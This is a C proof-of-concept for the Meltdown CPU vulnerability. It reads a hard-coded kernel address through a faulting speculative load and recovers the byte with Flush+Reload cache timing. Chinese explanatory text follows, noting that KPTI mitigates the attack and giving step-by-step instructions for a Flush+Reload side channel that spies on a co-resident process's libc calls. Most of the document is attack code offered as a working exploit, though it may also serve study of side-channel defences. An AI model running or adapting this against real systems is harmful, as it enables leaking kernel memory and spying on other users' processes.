#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80
#define PROBE_SIZE 256

static sigjmp_buf jmpbuf;
static volatile int fault_occurred = 0;

void sigsegv_handler(int sig) {
    fault_occurred = 1;
    siglongjmp(jmpbuf, 1);
}

uint8_t probe[PROBE_SIZE * 64];

// 测量函数
uint64_t measure_access(volatile char *addr) {
    uint64_t start, end;
    _mm_mfence();
    start = __rdtsc();
    _mm_lfence();
    volatile char tmp = *addr;
    _mm_lfence();
    end = __rdtsc();
    _mm_mfence();
    return end - start;
}

// 尝试读取内核地址的一个字节
char meltdown_read(volatile char *kernel_addr) {
    int i;
    // 清空探针缓存
    for (i = 0; i < PROBE_SIZE; i++) {
        _mm_clflush(&probe[i * 64]);
    }
    _mm_mfence();

    // 设置信号处理
    signal(SIGSEGV, sigsegv_handler);
    if (sigsetjmp(jmpbuf, 1) == 0) {
        // 尝试读取内核地址（会触发异常）
        // 但乱序执行会先执行后续指令
        char val = *kernel_addr;  // 触发页错误
        // 以下指令在乱序执行中可能被执行
        volatile char tmp = probe[val * 64];
        // 正常不会到达这里
        (void)tmp;
    } else {
        // 异常处理完成
        // 检查探针缓存
        for (i = 0; i < PROBE_SIZE; i++) {
            uint64_t time = measure_access(&probe[i * 64]);
            if (time < CACHE_HIT_THRESHOLD) {
                return (char)i;
            }
        }
    }
    return -1;
}

int main() {
    // 示例内核地址（需要根据系统调整，通常需要root权限或已知偏移）
    volatile char *target = (volatile char*)0xffffffff81000000;
    char byte = meltdown_read(target);
    if (byte != -1) {
        printf("Read byte: 0x%02x\n", (unsigned char)byte);
    } else {
        printf("Failed to read\n");
    }
    return 0;
}

注意：该POC在真实系统上可能因KPTI（内核页表隔离）而失效，因为用户态页表不再映射内核地址。修复方法：Linux内核引入KAISER/KPTI，将内核页表与用户态分离，使得用户态无法访问任何内核地址（即使乱序执行也无法加载数据到缓存）。此外，Intel微码更新也增加了`lfence`等序列化指令。

Flush+Reload攻击利用共享库（如libc.so）在物理内存中的共享特性。由于多个进程映射同一共享库的相同物理页面，攻击者可以通过监控缓存行来推断受害者是否执行了特定函数。具体步骤：
1. 确定目标函数（如`puts`）在共享库中的虚拟地址。可以通过`/proc/self/maps`或`dladdr`获取。
2. 攻击者与受害者运行在同一主机上，且共享库被映射到相同物理页（但虚拟地址可能不同）。
3. 攻击者反复执行Flush+Reload循环：清除目标函数入口地址的缓存行，等待一段时间，然后重新加载并测量延迟。如果受害者在此期间执行了该函数，其指令会被加载到缓存，导致攻击者Reload命中。
4. 通过统计命中次数，可以推断受害者调用该函数的频率或时机。

